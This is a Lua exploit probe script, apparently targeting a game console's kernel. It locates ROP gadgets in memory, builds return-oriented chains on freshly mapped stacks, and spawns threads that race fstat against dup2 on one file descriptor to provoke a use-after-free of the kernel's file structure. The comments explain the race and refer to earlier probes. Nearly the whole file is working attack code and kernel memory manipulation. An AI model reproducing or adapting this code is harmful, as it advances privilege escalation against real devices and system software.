-- CRASH_CLASS: HIGH
-- PROBE 425a: fstat racing dup2 over the same descriptor number
--
-- 418a proved a chain can end on 431 thr_exit: six children each wrote and exited, and
-- the loader still answered a syscall afterwards. Children no longer park, so a race no
-- longer costs a relaunch.
--
-- close only frees the descriptor once. dup2 is the version that keeps freeing: every
-- call closes whatever file the destination number holds and installs the source file in
-- its place, so the file object behind the number is released and rebuilt on every link.
-- A loops fstat 1200 times on the number; B loops dup2(zero, number) 1200 times. If the
-- lookup does not hold a reference across the call, A is reading a freed file structure.

print("=== PROBE 425a: FSTAT x DUP2 ===")

local FSTATS = 1200

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end

local function cstr(s)
    local b = memory.alloc(0x40)
    local i = 1
    while i <= #s do memory.write_byte(b + i - 1, s:byte(i)); i = i + 1 end
    memory.write_byte(b + #s, 0)
    return b
end

-- [A] gadgets and one readable file
local path = cstr("/app0/eboot.bin")
local fd = call(5, sgn(path), 0, 0)
local zpath = cstr("/dev/zero")
local zfd = call(5, sgn(zpath), 0, 0)
print(string.format("[A] open eboot.bin fd=%d  /dev/zero fd=%d", fd, zfd))
if fd <= 0 or zfd <= 0 then print("=== 425a DONE ===") return end
local st = memory.alloc(0x200)
local probe_stat = call(189, fd, sgn(st))
print(string.format("[A] control fstat rv=%d", probe_stat))

local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
call(593, 0, sgn(info), 0, 0, 0, 0)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
if size > 0x600000 then size = 0x600000 end
local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 425a DONE ===") return end
    buf = b
end
local park, pop_rax = 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local x, y = buf:byte(i, i + 1)
        if x == 0xEB and y == 0xFE and park == 0 then park = base + i - 1 end
        if x == 0x58 and y == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 then break end
        i = i + 1
    end
end
local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[B] base=0x%X park=0x%X pop=0x%X gadget=0x%X", base, park, pop_rax, gadget))
if park <= 0 or pop_rax <= 0 or gadget <= 0 then print("=== 425a DONE ===") return end

-- [C] a chain builder that ends on thr_exit
local function spawn(links, args)
    local stack = call(477, 0, 0x200000, 3, 0x1002, 0xFFFFFFFF, 0)
    if stack <= 0 then return -1, 0 end
    local rsp = stack + 0x100000
    local p = rsp
    local function wq(v) memory.write_qword(p, u64v(v)); p = p + 8 end
    local n = #links
    local i = 1
    while i <= n do
        wq(links[i])
        wq(gadget)
        if i < n then
            wq(pop_rax)
        end
        i = i + 1
    end
    wq(pop_rax)
    wq(431)
    wq(gadget)
    wq(park)

    local ctx = memory.alloc(0x500)
    local k = 0
    while k < 0x500 do memory.write_dword(ctx + k, 0); k = k + 4 end
    memory.write_qword(ctx + 0x108, u64(0, 0x480))
    memory.write_qword(ctx + 0x110, u64(0, 0x10000))
    memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
    memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
    memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
    memory.write_qword(ctx + 0x0f8, u64v(rsp))
    memory.write_qword(ctx + 0x100, u64(0, 0x3b))
    memory.write_qword(ctx + 0x048, u64v(args[1] or 0))
    memory.write_qword(ctx + 0x050, u64v(args[2] or 0))
    memory.write_qword(ctx + 0x058, u64v(args[3] or 0))
    memory.write_qword(ctx + 0x060, u64v(args[4] or 0))
    memory.write_qword(ctx + 0x068, u64v(args[5] or 0))

    local out = memory.alloc(0x20)
    memory.write_qword(out, u64(0, 0))
    local rv = call(430, sgn(ctx), sgn(out), 0)
    local tl = 0
    do
        local tq = memory.read_qword(out)
        if type(tq) == "table" then tl = to_num(tq.l) else tl = to_num(tq) end
    end
    return rv, tl
end

local stat_links = {}
local i = 1
while i <= FSTATS do stat_links[i] = 189; i = i + 1 end
local dup_links = {}
i = 1
while i <= FSTATS do dup_links[i] = 90; i = i + 1 end
local a_rv, a_tid = spawn(stat_links, {fd, sgn(st)})
print(string.format("[C] fstat child rv=%d tid=0x%X (%d links)", a_rv, a_tid, FSTATS))

local b_rv, b_tid = spawn(dup_links, {zfd, fd})
print(string.format("[C] dup2 child rv=%d tid=0x%X (1200 links)", b_rv, b_tid))

local t = 0
while t < 20000000 do t = t + 1 end

-- [E] after: the descriptor should be closed, and the process should be intact
local after_stat = call(189, fd, sgn(st))
local live = call(432, memory.alloc(0x20), 0)
print(string.format("[E] fstat on the raced descriptor rv=%d  thr_self rv=%d", after_stat, live))
local fd2 = call(5, sgn(path), 0, 0)
print(string.format("[E] reopen rv=%d", fd2))
print("=== 425a DONE ===")
